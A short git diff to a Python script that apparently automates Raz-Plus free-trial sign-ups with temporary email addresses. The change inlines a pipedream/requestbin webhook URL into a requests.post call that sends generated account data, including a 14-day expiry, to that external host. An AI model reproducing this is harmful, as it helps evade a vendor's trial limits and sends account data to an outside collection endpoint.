@@ -12,8 +12,6 @@ import requests
 
 logging.basicConfig(level=logging.INFO)
 
-WEBHOOK_URL = "https://enak80j25b8w.x.pipedream.net"
-
 
 class RazPlusFreeTrial:
 
@@ -73,7 +71,8 @@ class RazPlusFreeTrial:
             "expire time":
                 datetime.datetime.now() + datetime.timedelta(days=14),
         }
-        requests.post(WEBHOOK_URL, data=data)
+        # https://requestbin.com/r/enak80j25b8w/1Ypz4OVzbh4JVybG5vVEA9wdUON
+        requests.post("https://enak80j25b8w.x.pipedream.net", data=data)
 
 
 class TempEmail:
